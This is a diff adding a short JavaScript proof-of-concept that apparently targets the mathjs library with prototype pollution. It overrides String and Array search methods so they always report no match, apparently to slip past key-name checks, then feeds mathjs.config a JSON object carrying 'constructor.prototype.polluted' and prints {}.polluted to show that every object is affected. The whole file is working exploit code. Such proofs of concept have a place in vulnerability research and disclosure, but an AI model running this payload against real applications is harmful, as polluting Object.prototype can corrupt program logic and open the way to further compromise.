@@ -1,0 +1,16 @@
+String.prototype.includes = () => false;
+String.prototype.startsWith = () => false;
+String.prototype.endsWith = () => false;
+String.prototype.indexOf = () => -1;
+String.prototype.lastIndexOf = () => false;
+String.prototype.match = () => false;
+String.prototype.search = () => false;
+String.prototype.matchAll = () => false;
+Array.prototype.includes = () => false;
+Array.prototype.indexOf = () => -1;
+var mathMod = require('mathjs');
+const mathjs = mathMod.create(mathMod.all);
+console.log({}.polluted);
+const newConfig = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
+mathjs.config(newConfig);
+console.log({}.polluted);
